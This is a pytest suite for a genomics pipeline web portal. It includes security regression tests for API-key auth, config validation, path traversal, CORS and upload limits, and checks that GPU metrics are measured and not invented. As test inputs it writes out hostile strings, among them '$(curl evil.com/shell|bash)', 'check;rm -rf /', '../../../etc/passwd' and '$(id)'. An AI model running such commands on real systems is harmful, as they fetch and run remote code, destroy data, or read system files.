"""
Tests for Genomics Pipeline Web Portal server.
"""
import pytest
import json
from pathlib import Path
from unittest.mock import Mock, patch, MagicMock
import sys

# Add the app directory to the path
sys.path.insert(0, str(Path(__file__).parent.parent / 'app'))


class TestStatusEndpoint:
    """Tests for /api/status endpoint."""

    def test_status_returns_json(self, client, mock_subprocess, mock_psutil):
        """Test that status endpoint returns JSON."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            assert response.status_code == 200
            assert response.content_type == 'application/json'

    def test_status_contains_pipeline_state(self, client, mock_subprocess, mock_psutil):
        """Test status includes pipeline state."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            data = json.loads(response.data)
            assert 'pipeline' in data
            assert 'status' in data['pipeline']

    def test_status_contains_system_info(self, client, mock_subprocess, mock_psutil):
        """Test status includes system information."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            data = json.loads(response.data)
            assert 'system' in data
            assert 'docker_installed' in data['system']
            assert 'gpu_available' in data['system']
            assert 'disk_space' in data['system']

    def test_status_contains_data_status(self, client, mock_subprocess, mock_psutil):
        """Test status includes data file status."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/status')
            data = json.loads(response.data)
            assert 'data' in data
            assert 'fastq_r1' in data['data']
            assert 'reference' in data['data']


class TestConfigEndpoint:
    """Tests for /api/config endpoint."""

    def test_get_config(self, client):
        """Test getting configuration."""
        response = client.get('/api/config')
        assert response.status_code == 200
        data = json.loads(response.data)
        # Should return a dictionary (possibly empty)
        assert isinstance(data, dict)

    def test_post_config_success(self, client, tmp_path):
        """Test updating configuration."""
        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
            # Create the config file
            (tmp_path / 'test.env').write_text("# Test config\nPATIENT_ID=HG002\n")

            response = client.post(
                '/api/config',
                data=json.dumps({'PATIENT_ID': 'HG003'}),
                content_type='application/json'
            )

            assert response.status_code == 200
            data = json.loads(response.data)
            assert data.get('success') == True


class TestRunEndpoint:
    """Tests for /api/run/<step> endpoint."""

    def test_run_invalid_step(self, client):
        """Test running invalid step returns error."""
        response = client.post('/api/run/invalid_step')
        assert response.status_code == 400
        data = json.loads(response.data)
        assert 'error' in data

    def test_run_valid_step(self, client, mock_subprocess):
        """Test running valid step starts execution."""
        with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
            with patch('server.threading.Thread') as mock_thread:
                mock_thread.return_value = Mock()
                response = client.post('/api/run/check')

                assert response.status_code == 200
                data = json.loads(response.data)
                assert data.get('success') == True
                assert data.get('step') == 'Prerequisites Check'

    def test_run_while_running(self, client):
        """Test cannot run step while another is running."""
        with patch('server.pipeline_state', {'status': 'running', 'logs': [], 'progress': 0}):
            response = client.post('/api/run/check')
            assert response.status_code == 400
            data = json.loads(response.data)
            assert 'error' in data


class TestStopEndpoint:
    """Tests for /api/stop endpoint."""

    def test_stop_success(self, client):
        """Test stopping running process."""
        with patch('server.running_processes', {}):
            with patch('server.pipeline_state', {'status': 'running'}):
                response = client.post('/api/stop')
                assert response.status_code == 200
                data = json.loads(response.data)
                assert data.get('success') == True


class TestStopAllEndpoint:
    """Tests for /api/stop-all endpoint."""

    def test_stop_all_success(self, client, mock_subprocess, mock_psutil):
        """Test stopping all processes."""
        mock_psutil.process_iter.return_value = []
        with patch('server.running_processes', {}):
            with patch('server.pipeline_state', {'status': 'running'}):
                response = client.post('/api/stop-all')
                assert response.status_code == 200
                data = json.loads(response.data)
                assert data.get('success') == True


class TestLogsEndpoint:
    """Tests for /api/logs/<log_type> endpoint."""

    def test_logs_invalid_type(self, client):
        """Test invalid log type returns error."""
        response = client.get('/api/logs/invalid_type')
        assert response.status_code == 400

    def test_logs_missing_file(self, client, tmp_path):
        """Test missing log file returns message."""
        with patch('server.LOG_DIR', tmp_path):
            response = client.get('/api/logs/chr20_fq2bam')
            assert response.status_code == 200
            data = json.loads(response.data)
            assert 'not found' in data.get('content', '').lower()


class TestMetricsEndpoint:
    """Tests for /api/metrics endpoint."""

    def test_metrics_returns_json(self, client, mock_psutil):
        """Test metrics endpoint returns JSON."""
        with patch('server.NVML_AVAILABLE', False):
            with patch('server.pipeline_state', {
                'status': 'idle',
                'start_time': None,
                'end_time': None,
                'current_step': None,
                'runtime_seconds': 0,
            }):
                response = client.get('/api/metrics')
                assert response.status_code == 200
                assert response.content_type == 'application/json'

    def test_metrics_contains_throughput(self, client, mock_psutil):
        """Test metrics includes throughput."""
        with patch('server.NVML_AVAILABLE', False):
            with patch('server.pipeline_state', {
                'status': 'idle',
                'start_time': None,
                'end_time': None,
                'current_step': None,
                'runtime_seconds': 0,
            }):
                response = client.get('/api/metrics')
                data = json.loads(response.data)
                assert 'throughput_gb_hr' in data
                assert 'runtime_seconds' in data
                assert 'gpu_utilization' in data


class TestHelperFunctions:
    """Tests for helper functions."""

    def test_check_docker_installed(self, mock_subprocess):
        """Test Docker check."""
        from server import check_docker
        mock_subprocess.run.return_value = Mock(returncode=0)
        assert check_docker() == True

    def test_check_docker_not_installed(self, mock_subprocess):
        """Test Docker not installed."""
        from server import check_docker
        mock_subprocess.run.side_effect = Exception("Docker not found")
        assert check_docker() == False

    def test_check_gpu_available(self, mock_subprocess):
        """Test GPU check."""
        from server import check_gpu
        mock_subprocess.run.return_value = Mock(returncode=0)
        assert check_gpu() == True

    def test_check_gpu_not_available(self, mock_subprocess):
        """Test GPU not available."""
        from server import check_gpu
        mock_subprocess.run.side_effect = Exception("nvidia-smi not found")
        assert check_gpu() == False

    def test_get_file_size_existing(self, tmp_path):
        """Test file size for existing file."""
        from server import get_file_size

        test_file = tmp_path / 'test.txt'
        test_file.write_text('x' * 1024)  # 1KB file

        size = get_file_size(test_file)
        assert '1.' in size or '1024' in size  # Either 1.x KB or 1024 B

    def test_get_file_size_missing(self):
        """Test file size for missing file."""
        from server import get_file_size
        size = get_file_size('/nonexistent/file.txt')
        assert size == 'N/A'


class TestGPUUtilization:
    """Tests for GPU utilization functions."""

    def test_get_gpu_utilization_no_nvml(self):
        """Test GPU utilization when pynvml not available."""
        from server import get_gpu_utilization

        with patch('server.NVML_AVAILABLE', False):
            result = get_gpu_utilization()
            assert result['available'] == False
            assert result['devices'] == []

    def test_get_gpu_utilization_with_nvml(self, mock_pynvml):
        """Test GPU utilization with pynvml mocked."""
        with patch('server.NVML_AVAILABLE', True):
            with patch('server.pynvml', mock_pynvml, create=True):
                from server import get_gpu_utilization
                result = get_gpu_utilization()
                assert result['available'] == True


class TestCPUUtilization:
    """Tests for CPU utilization functions."""

    def test_get_cpu_utilization(self, mock_psutil):
        """Test CPU utilization."""
        from server import get_cpu_utilization
        result = get_cpu_utilization()
        assert 'percent' in result
        assert 'count' in result
        assert result['percent'] == 25.5


class TestMemoryUtilization:
    """Tests for memory utilization functions."""

    def test_get_memory_utilization(self, mock_psutil):
        """Test memory utilization."""
        from server import get_memory_utilization
        result = get_memory_utilization()
        assert 'percent' in result
        assert 'used_gb' in result
        assert 'total_gb' in result
        assert result['percent'] == 45.0


class TestStreamEndpoint:
    """Tests for /api/stream SSE endpoint."""

    def test_stream_endpoint_returns_event_stream(self, client):
        """Test stream endpoint returns event-stream content type."""
        with patch('server.pipeline_state', {
            'status': 'idle',
            'current_step': None,
            'start_time': None,
            'end_time': None,
            'error_message': None,
            'logs': []
        }):
            response = client.get('/api/stream')
            # SSE endpoints return event-stream
            assert 'text/event-stream' in response.content_type


class TestInputValidation:
    """Tests for input validation."""

    def test_run_step_validates_input(self, client):
        """Test that run step rejects malicious input."""
        # SQL injection attempt — Flask may return 404 (route not matched) or 405
        response = client.post('/api/run/check;rm -rf /')
        assert response.status_code in (400, 404, 405)

        # Path traversal attempt — Werkzeug normalizes ../  before routing
        response = client.post('/api/run/../../../etc/passwd')
        assert response.status_code in (400, 404, 405)

    def test_logs_validates_input(self, client):
        """Test that logs endpoint rejects malicious input."""
        # Path traversal attempt — Werkzeug normalizes ../ before routing
        response = client.get('/api/logs/../../../etc/passwd')
        assert response.status_code in (400, 404)

    def test_config_post_rejects_shell_injection(self, client, tmp_path):
        """Test that config POST rejects shell metacharacters."""
        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
            (tmp_path / 'test.env').write_text("# Config\n")
            response = client.post(
                '/api/config',
                data=json.dumps({'PB_IMG': '$(curl evil.com/shell|bash)'}),
                content_type='application/json'
            )
            assert response.status_code == 400
            data = json.loads(response.data)
            assert 'error' in data

    def test_config_post_rejects_lowercase_key(self, client, tmp_path):
        """Test that config POST rejects invalid key format."""
        with patch('server.CONFIG_FILE', tmp_path / 'test.env'):
            (tmp_path / 'test.env').write_text("# Config\n")
            response = client.post(
                '/api/config',
                data=json.dumps({'invalid_key': 'value'}),
                content_type='application/json'
            )
            assert response.status_code == 400


class TestApiKeyAuth:
    """Tests for require_api_key decorator."""

    def test_run_requires_api_key(self, client):
        """Test that /api/run requires API key when PORTAL_API_KEY is set."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
                response = client.post('/api/run/check')
                assert response.status_code == 401
                data = json.loads(response.data)
                assert 'Unauthorized' in data.get('error', '')

    def test_run_accepts_valid_key(self, client, mock_subprocess):
        """Test that /api/run works with correct API key."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
                with patch('server.threading.Thread') as mock_thread:
                    mock_thread.return_value = Mock()
                    response = client.post(
                        '/api/run/check',
                        headers={'X-API-Key': 'test-secret-key'}
                    )
                    assert response.status_code == 200

    def test_run_refused_without_key_set(self, anon_client, mock_subprocess, tmp_path, monkeypatch):
        """S3 regression: an unset PORTAL_API_KEY must refuse, not wave the caller through.

        This test previously asserted the opposite — that /api/run succeeded with no key
        configured — which is the fail-open defect itself. The decorator now generates an
        ephemeral key instead of becoming a pass-through.
        """
        import server
        monkeypatch.delenv('PORTAL_API_KEY', raising=False)
        monkeypatch.setenv('PORTAL_API_KEY_FILE', str(tmp_path / 'portal.key'))
        monkeypatch.setattr(server._portal_api_key, '_ephemeral', None, raising=False)
        try:
            with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
                with patch('server.threading.Thread') as mock_thread:
                    mock_thread.return_value = Mock()
                    response = anon_client.post('/api/run/check')
                    assert response.status_code == 401
                    assert 'Unauthorized' in json.loads(response.data).get('error', '')
        finally:
            server._portal_api_key._ephemeral = None

    def test_stop_requires_api_key(self, client):
        """Test that /api/stop requires API key."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.running_processes', {}):
                with patch('server.pipeline_state', {'status': 'running'}):
                    response = client.post('/api/stop')
                    assert response.status_code == 401

    def test_reset_requires_api_key(self, client, tmp_path):
        """Test that /api/reset requires API key."""
        with patch.dict('os.environ', {'PORTAL_API_KEY': 'test-secret-key'}):
            with patch('server.STATE_FILE', tmp_path / 'state.json'):
                response = client.post('/api/reset')
                assert response.status_code == 401


class TestPathTraversal:
    """Tests for path traversal prevention in file operations."""

    def test_download_rejects_dotdot(self, client):
        """Test that download rejects path traversal via '..'."""
        response = client.get('/api/files/download/output/..%2F..%2Fetc%2Fpasswd')
        assert response.status_code in (400, 404)

    def test_download_sanitizes_filename(self, client, tmp_path):
        """Test that download uses secure_filename."""
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'output').mkdir(exist_ok=True)
            response = client.get('/api/files/download/output/..%2Fsecret.txt')
            assert response.status_code in (400, 404)

    def test_delete_rejects_dotdot(self, client):
        """Test that delete rejects path traversal via '..'."""
        response = client.delete('/api/files/delete/output/..%2F..%2Fetc%2Fpasswd')
        assert response.status_code in (400, 404)

    def test_upload_sanitizes_filename(self, client, tmp_path):
        """Test that upload sanitizes filenames using secure_filename."""
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'input').mkdir(exist_ok=True)
            import io
            data = {'file': (io.BytesIO(b'test data'), '../../evil.sh')}
            response = client.post(
                '/api/files/upload/input',
                data=data,
                content_type='multipart/form-data'
            )
            # Should either sanitize the name or reject it
            if response.status_code == 200:
                result = json.loads(response.data)
                # secure_filename strips traversal chars
                assert '..' not in result.get('filename', '')
                assert '/' not in result.get('filename', '')
            else:
                assert response.status_code == 400


# ─────────────────────────────────────────────────────────────────────────────────────────
# Security regression tests (2026-11-03 pre-release audit, findings S1, S2, S3, S6, S9, S15)
#
# Each test below pins down a defect that was confirmed in this file and is now fixed. They
# assert the *refusal*: that an unauthenticated or malformed call does not succeed.
# ─────────────────────────────────────────────────────────────────────────────────────────


class TestUnauthenticatedConfigRefused:
    """S1/S2 regression: /api/config carried no credential on either method."""

    def test_config_get_requires_key(self, anon_client):
        """GET /api/config returned the whole pipeline env file to anyone."""
        response = anon_client.get('/api/config')
        assert response.status_code == 401

    def test_config_post_requires_key(self, anon_client, tmp_path):
        """POST /api/config wrote to a shell-sourced file with no credential."""
        with patch('server.CONFIG_FILE', tmp_path / 'pipeline.env'):
            (tmp_path / 'pipeline.env').write_text("# Config\nPATIENT_ID=HG002\n")
            response = anon_client.post(
                '/api/config',
                data=json.dumps({'PATIENT_ID': 'HG003'}),
                content_type='application/json',
            )
            assert response.status_code == 401
            # And nothing was written.
            assert 'HG003' not in (tmp_path / 'pipeline.env').read_text()

    def test_config_get_omits_undeclared_keys(self, client, tmp_path):
        """S2 regression: a credential an operator kept in pipeline.env was served."""
        with patch('server.CONFIG_FILE', tmp_path / 'pipeline.env'):
            (tmp_path / 'pipeline.env').write_text(
                "PATIENT_ID=HG002\nNGC_API_KEY=SYNTHETIC-not-a-real-credential\n"
                "REGISTRY_TOKEN=also-secret\n"
            )
            response = client.get('/api/config')
            assert response.status_code == 200
            body = response.get_data(as_text=True)
            data = json.loads(body)
            assert data.get('PATIENT_ID') == 'HG002'
            assert 'NGC_API_KEY' not in data
            assert 'REGISTRY_TOKEN' not in data
            assert 'SYNTHETIC-not-a-real-credential' not in body
            assert 'also-secret' not in body


class TestConfigValueValidation:
    """S1 regression: values reaching a file that bash executes."""

    def _post(self, client, tmp_path, payload):
        with patch('server.CONFIG_FILE', tmp_path / 'pipeline.env'):
            (tmp_path / 'pipeline.env').write_text("# Config\nPATIENT_ID=HG002\n")
            response = client.post(
                '/api/config',
                data=json.dumps(payload),
                content_type='application/json',
            )
            return response, (tmp_path / 'pipeline.env').read_text()

    def test_newline_in_value_rejected(self, client, tmp_path):
        """The old filter blocked five metacharacters but not the line break."""
        response, written = self._post(
            client, tmp_path,
            {'OUT': '/tmp/out\nsome-extra-line\nmore'},
        )
        assert response.status_code == 400
        assert 'some-extra-line' not in written

    def test_carriage_return_in_value_rejected(self, client, tmp_path):
        response, written = self._post(client, tmp_path, {'PATIENT_ID': 'HG002\rHG003'})
        assert response.status_code == 400
        assert 'HG003' not in written

    def test_shell_metacharacters_rejected(self, client, tmp_path):
        for value in ('$(id)', '`id`', 'a|b', 'a;b', 'a&b', 'a>b', "a'b", 'a"b', 'a b'):
            response, written = self._post(client, tmp_path, {'PATIENT_ID': value})
            assert response.status_code == 400, f'accepted {value!r}'
            assert value not in written

    def test_unlisted_image_rejected(self, client, tmp_path):
        """PB_IMG is the image argument to `docker run` with host mounts and GPU access."""
        response, written = self._post(
            client, tmp_path, {'PB_IMG': 'docker.io/attacker/payload:latest'})
        assert response.status_code == 400
        assert 'attacker' not in written

    def test_allowlisted_image_accepted(self, client, tmp_path):
        response, written = self._post(
            client, tmp_path, {'PB_IMG': 'nvcr.io/nvidia/clara/clara-parabricks:4.6.0-1'})
        assert response.status_code == 200
        assert 'clara-parabricks:4.6.0-1' in written

    def test_image_allowlist_is_configurable(self, client, tmp_path, monkeypatch):
        monkeypatch.setenv('PORTAL_ALLOWED_IMAGES', 'registry.example.org/own/parabricks:1.2')
        response, written = self._post(
            client, tmp_path, {'PB_IMG': 'registry.example.org/own/parabricks:1.2'})
        assert response.status_code == 200
        assert 'registry.example.org/own/parabricks:1.2' in written

    def test_path_outside_root_rejected(self, client, tmp_path, monkeypatch):
        monkeypatch.setenv('PORTAL_CONFIG_PATH_ROOT', str(tmp_path / 'engine'))
        (tmp_path / 'engine').mkdir()
        response, written = self._post(client, tmp_path, {'OUT': '/etc'})
        assert response.status_code == 400
        assert '/etc' not in written

    def test_path_inside_root_accepted(self, client, tmp_path, monkeypatch):
        root = tmp_path / 'engine'
        root.mkdir()
        monkeypatch.setenv('PORTAL_CONFIG_PATH_ROOT', str(root))
        response, written = self._post(client, tmp_path, {'OUT': str(root / 'data' / 'output')})
        assert response.status_code == 200

    def test_written_value_survives_being_sourced(self, client, tmp_path):
        """What the pipeline scripts actually do: `source` the file and read the value."""
        import subprocess as sp
        response, _ = self._post(client, tmp_path, {'PATIENT_ID': 'HG003'})
        assert response.status_code == 200
        out = sp.run(['bash', '-c',
                      f'set -a; source {tmp_path / "pipeline.env"}; printf "%s" "$PATIENT_ID"'],
                     capture_output=True, text=True)
        assert out.returncode == 0, out.stderr
        assert out.stdout == 'HG003'

    def test_save_config_quotes_values(self, tmp_path, monkeypatch):
        """Second line of defence, exercised directly.

        The route rejects dangerous values before save_config sees them, so this bypasses
        the route's validation to prove the writer itself emits shell-inert text.
        """
        import subprocess as sp
        import server
        monkeypatch.setattr(server, 'validate_config_entry', lambda key, value: None)
        with patch('server.CONFIG_FILE', tmp_path / 'pipeline.env'):
            (tmp_path / 'pipeline.env').write_text("# Config\n")
            server.save_config({'PATIENT_ID': '$(id) ; echo pwned'})
            written = (tmp_path / 'pipeline.env').read_text()
            assert "'$(id) ; echo pwned'" in written
            out = sp.run(['bash', '-c',
                          f'set -a; source {tmp_path / "pipeline.env"}; printf "%s" "$PATIENT_ID"'],
                         capture_output=True, text=True)
            assert out.returncode == 0, out.stderr
            # Verbatim, not executed.
            assert out.stdout == '$(id) ; echo pwned'

    def test_written_file_is_shell_safe(self, client, tmp_path):
        """`bash -n` on the written file: the pipeline scripts `source` it."""
        import subprocess as sp
        response, _ = self._post(client, tmp_path, {'PATIENT_ID': 'HG003', 'NUM_GPUS': '2'})
        assert response.status_code == 200
        check = sp.run(['bash', '-n', str(tmp_path / 'pipeline.env')],
                       capture_output=True, text=True)
        assert check.returncode == 0, check.stderr

    def test_save_config_refuses_unvalidated_values(self, tmp_path):
        """Defence in depth: save_config itself will not write an unvalidated value."""
        import server
        with patch('server.CONFIG_FILE', tmp_path / 'pipeline.env'):
            (tmp_path / 'pipeline.env').write_text("# Config\n")
            with pytest.raises(ValueError):
                server.save_config({'OUT': '/tmp/x\ninjected-line'})
            assert 'injected-line' not in (tmp_path / 'pipeline.env').read_text()


class TestUnauthenticatedReadsRefused:
    """S9 regression: read routes were weaker than their sibling write routes."""

    def test_logs_require_key(self, anon_client, tmp_path):
        with patch('server.LOG_DIR', tmp_path):
            response = anon_client.get('/api/logs/chr20_fq2bam')
            assert response.status_code == 401

    def test_file_listing_requires_key(self, anon_client, tmp_path):
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'output').mkdir(exist_ok=True)
            response = anon_client.get('/api/files/output')
            assert response.status_code == 401

    def test_download_requires_key(self, anon_client, tmp_path):
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'output').mkdir(exist_ok=True)
            (tmp_path / 'output' / 'patient.vcf').write_text('##fileformat=VCFv4.2\n')
            response = anon_client.get('/api/files/download/output/patient.vcf')
            assert response.status_code == 401

    def test_download_accepts_query_key_for_browser_navigation(self, client, tmp_path,
                                                                 portal_api_key):
        """A download started by navigation cannot set a header, so ?api_key= is accepted."""
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'output').mkdir(exist_ok=True)
            (tmp_path / 'output' / 'patient.vcf').write_text('##fileformat=VCFv4.2\n')
            response = client.get(
                f'/api/files/download/output/patient.vcf?api_key={portal_api_key}',
                headers={'X-API-Key': ''})
            assert response.status_code == 200

    def test_stream_requires_key(self, anon_client):
        with patch('server.pipeline_state', {
            'status': 'idle', 'current_step': None, 'start_time': None,
            'end_time': None, 'error_message': None, 'logs': []
        }):
            response = anon_client.get('/api/stream')
            assert response.status_code == 401

    def test_query_key_not_accepted_on_mutating_routes(self, anon_client, portal_api_key):
        """The query-string fallback is opt-in per route, not a global second door."""
        with patch('server.pipeline_state', {'status': 'idle', 'logs': [], 'progress': 0}):
            response = anon_client.post(f'/api/run/check?api_key={portal_api_key}')
            assert response.status_code == 401


class TestApiKeyComparison:
    """The portal's key check must be constant-time and must not raise on odd input."""

    def test_non_ascii_header_is_401_not_500(self, anon_client):
        """compare_digest on str raises TypeError on non-ASCII; bytes do not."""
        response = anon_client.get('/api/config', headers={'X-API-Key': 'pässwörd'})
        assert response.status_code == 401

    def test_non_ascii_configured_key_still_works(self, anon_client, monkeypatch):
        monkeypatch.setenv('PORTAL_API_KEY', 'pässwörd-ünicode')
        bad = anon_client.get('/api/config', headers={'X-API-Key': 'wrong'})
        assert bad.status_code == 401
        good = anon_client.get('/api/config', headers={'X-API-Key': 'pässwörd-ünicode'})
        assert good.status_code == 200

    def test_empty_header_refused(self, anon_client):
        response = anon_client.get('/api/config', headers={'X-API-Key': ''})
        assert response.status_code == 401

    def test_comparison_is_constant_time(self):
        """Guard against a regression back to `!=`."""
        import inspect
        import server
        source = inspect.getsource(server._api_key_matches)
        assert 'compare_digest' in source


class TestEphemeralKeyHandling:
    """S3/S10 regression: the generated key must be usable without being logged."""

    def test_ephemeral_key_file_is_private_and_key_not_logged(self, tmp_path, monkeypatch):
        import server
        key_file = tmp_path / 'portal.key'
        monkeypatch.delenv('PORTAL_API_KEY', raising=False)
        monkeypatch.setenv('PORTAL_API_KEY_FILE', str(key_file))
        monkeypatch.setattr(server._portal_api_key, '_ephemeral', None, raising=False)
        records = []
        sink = server.logger.add(lambda m: records.append(str(m)), level='DEBUG')
        try:
            key = server._portal_api_key()
        finally:
            server.logger.remove(sink)
            server._portal_api_key._ephemeral = None
        logged = '\n'.join(records)
        assert key
        assert key_file.exists()
        assert oct(key_file.stat().st_mode & 0o777) == '0o600'
        assert key_file.read_text().strip() == key
        # The log must name the key FILE, never the key.
        assert logged.strip(), 'expected the portal to log where the key went'
        assert key not in logged
        assert str(key_file) in logged


class TestCorsDefault:
    """S6 regression: the portal's CORS default was '*'."""

    def test_default_origins_have_no_wildcard(self):
        import server
        assert '*' not in server.DEFAULT_CORS_ORIGINS
        assert 'localhost' in server.DEFAULT_CORS_ORIGINS

    def test_credentials_not_enabled(self, client):
        """A wildcard origin with credentials is the dangerous combination."""
        response = client.get('/api/config',
                              headers={'Origin': 'http://localhost:5000'})
        assert response.headers.get('Access-Control-Allow-Credentials') is None

    def test_foreign_origin_not_echoed(self, client):
        response = client.get('/api/config',
                              headers={'Origin': 'https://evil.example'})
        assert response.headers.get('Access-Control-Allow-Origin') != 'https://evil.example'


class TestUploadSizeCap:
    """S15 regression: upload reads were unbounded."""

    def test_oversize_declared_upload_refused(self, client, tmp_path, monkeypatch):
        import io
        monkeypatch.setenv('PORTAL_MAX_UPLOAD_BYTES', '64')
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'input').mkdir(exist_ok=True)
            data = {'file': (io.BytesIO(b'x' * 4096), 'big.fastq')}
            response = client.post('/api/files/upload/input', data=data,
                                   content_type='multipart/form-data')
            assert response.status_code == 413
            assert not (tmp_path / 'input' / 'big.fastq').exists()

    def test_within_limit_upload_accepted(self, client, tmp_path, monkeypatch):
        import io
        monkeypatch.setenv('PORTAL_MAX_UPLOAD_BYTES', str(1024 * 1024))
        with patch('server.DATA_DIR', tmp_path):
            (tmp_path / 'input').mkdir(exist_ok=True)
            data = {'file': (io.BytesIO(b'@read1\nACGT\n+\nIIII\n'), 'small.fastq')}
            response = client.post('/api/files/upload/input', data=data,
                                   content_type='multipart/form-data')
            assert response.status_code == 200
            assert (tmp_path / 'input' / 'small.fastq').exists()


class TestGpuMetricsAreMeasuredNotInvented:
    """Regression tests for the fabricated GPU telemetry (2026-11-04 audit).

    `get_detailed_gpu_metrics` used to return six fields of which five were invented: a
    theoretical maximum scaled by GPU utilization, then jittered with
    `hash(str(time.time()))` so the dashboard moved like an instrument while measuring
    nothing. The jitter is what makes this testable -- a fabricated reading cannot be
    reproducible, so determinism under fixed inputs is the assertion that pins it.
    """

    def test_unmeasurable_fields_are_none_not_zero(self):
        """None renders as '--'. Zero is a real reading and must stay distinguishable."""
        import server
        with patch('server.NVML_AVAILABLE', False):
            metrics = server.get_detailed_gpu_metrics()
        assert metrics, "expected a dict of fields even with NVML absent"
        assert all(v is None for v in metrics.values()), metrics

    def _fake_pynvml(self):
        """NVML stubbed with fixed readings; nothing here varies between calls."""
        # create=True: `pynvml` is imported inside a try/except, so on a box without the
        # package the module has no such attribute to patch.
        fake = MagicMock()
        fake.nvmlDeviceGetUtilizationRates.return_value = Mock(gpu=70, memory=42)
        fake.nvmlDeviceGetPowerUsage.return_value = 91_500          # mW
        fake.nvmlDeviceGetPcieThroughput.side_effect = lambda h, kind: (
            2_000_000 if kind == fake.NVML_PCIE_UTIL_TX_BYTES else 3_000_000)  # KB/s
        fake.nvmlDeviceGetTemperature.return_value = 61
        fake.nvmlDeviceGetClockInfo.return_value = 1_400
        # The current implementation never asks about running processes. The OLD one gated
        # its invented fields on `len(nvmlDeviceGetComputeRunningProcesses(h)) > 0`, and a
        # bare MagicMock raises on len(), which sent it down the all-zeros branch -- so the
        # determinism test below passed against the defect for the wrong reason. A
        # one-process list makes the fabrication path execute, which is what that test needs
        # in order to be able to fail.
        fake.nvmlDeviceGetComputeRunningProcesses.return_value = [Mock()]
        return fake

    def test_identical_readings_give_identical_output(self):
        """The defining property of a measurement: same input, same output.

        The old implementation failed this, because each field mixed in
        hash(str(time.time())).
        """
        import server
        fake = self._fake_pynvml()
        with patch('server.NVML_AVAILABLE', True), patch('server.pynvml', fake, create=True):
            first = server.get_detailed_gpu_metrics()
            second = server.get_detailed_gpu_metrics()
        assert first == second, f"telemetry is not reproducible: {first} != {second}"

    def test_values_come_from_nvml_not_from_a_ceiling(self):
        """Each field must trace to the stubbed NVML reading, with unit conversion only."""
        import server
        fake = self._fake_pynvml()
        with patch('server.NVML_AVAILABLE', True), patch('server.pynvml', fake, create=True):
            m = server.get_detailed_gpu_metrics()
        assert m['memory_controller_pct'] == 42.0      # utilization.memory, verbatim
        assert m['power_draw_w'] == 91.5               # 91,500 mW -> W
        assert m['pcie_tx_gb_s'] == 2.0                # 2,000,000 KB/s -> GB/s
        assert m['pcie_rx_gb_s'] == 3.0
        assert m['temperature_c'] == 61.0
        assert m['sm_clock_mhz'] == 1400.0

    def test_one_failing_field_does_not_cost_the_others(self):
        """A device that cannot report power must still report its temperature."""
        import server
        fake = self._fake_pynvml()
        fake.nvmlDeviceGetPowerUsage.side_effect = RuntimeError("not supported")
        with patch('server.NVML_AVAILABLE', True), patch('server.pynvml', fake, create=True):
            m = server.get_detailed_gpu_metrics()
        assert m['power_draw_w'] is None
        assert m['temperature_c'] == 61.0

    def test_no_fabrication_in_the_executable_body(self):
        """A source guard, because the next regression would look plausible on a chart."""
        import ast
        import inspect
        import server
        fn = ast.parse(inspect.getsource(server.get_detailed_gpu_metrics)).body[0]
        body = [n for n in fn.body
                if not (isinstance(n, ast.Expr)
                        and isinstance(n.value, ast.Constant)
                        and isinstance(n.value.value, str))]
        code = ast.unparse(ast.Module(body=body, type_ignores=[]))
        for token in ('hash(', 'random', 'time.time'):
            assert token not in code, f"{token} is back in the telemetry path"

    def test_modeled_throughput_declares_itself(self, client, mock_psutil):
        """The one number that is a model must say so in its own payload."""
        with patch('server.NVML_AVAILABLE', False):
            response = client.get('/api/metrics')
        assert response.status_code == 200
        data = json.loads(response.data)
        assert data['throughput_is_modeled'] is True
        assert 'Not a measurement' in data['throughput_model']
